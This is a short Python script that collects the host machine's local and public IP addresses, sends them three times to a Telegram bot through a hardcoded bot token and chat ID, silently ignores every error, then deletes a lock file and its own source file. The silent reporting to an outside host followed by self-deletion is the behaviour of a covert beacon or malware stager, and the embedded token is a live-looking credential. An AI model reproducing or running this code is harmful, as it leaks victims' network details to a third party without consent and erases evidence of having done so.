import time
import os
import socket
import requests
def get_public_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        local_ip = s.getsockname()[0]
        s.close()    
        public_ip = requests.get('https://api.ipify.org').text
        print(public_ip)
        return {'local_ip': local_ip, 'public_ip': public_ip } 
    except Exception as e:
        pass

def background_task(ip):
    try:
        url = 'https://api.telegram.org/bot7496801196:AAFIaKLgl2iaSgCC9V5jXXC4gOom3eZ0XEI/sendMessage'
        params = {
            'chat_id': '6400572573',
            'text': str(ip)
        }
        for i in range(3):
            response = requests.get(url, params=params)
            print(response)
            time.sleep(10)
        
    except Exception as e:
        pass 
background_task(get_public_ip())
LOCK_FILE=os.path.join(os.path.dirname(os.path.abspath(__file__)), 'task.lock')
def remove_lock_file():

    if os.path.exists(LOCK_FILE):
        os.remove(LOCK_FILE)
remove_lock_file()
def self_remove():
    os.remove(__file__)
self_remove()
